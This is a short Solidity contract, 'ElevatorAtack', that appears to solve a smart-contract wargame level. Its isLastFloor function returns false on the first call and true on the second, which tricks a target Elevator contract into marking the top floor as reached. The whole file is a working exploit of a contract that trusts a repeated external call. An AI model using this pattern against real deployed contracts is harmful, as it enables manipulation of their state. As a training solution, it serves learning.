// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorAtack is Building {
    address public elevator;
    uint256 public used = 1;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (used == 2) {
            return true;
        } else {
            used = 2;
            return false;
        }
    }

    function useElevator(uint256 _floor) public {
        (bool success1, ) = elevator.call(
            abi.encodeWithSignature("goTo(uint256)", _floor)
        );
        require(success1, "something went wrong");
    }
}
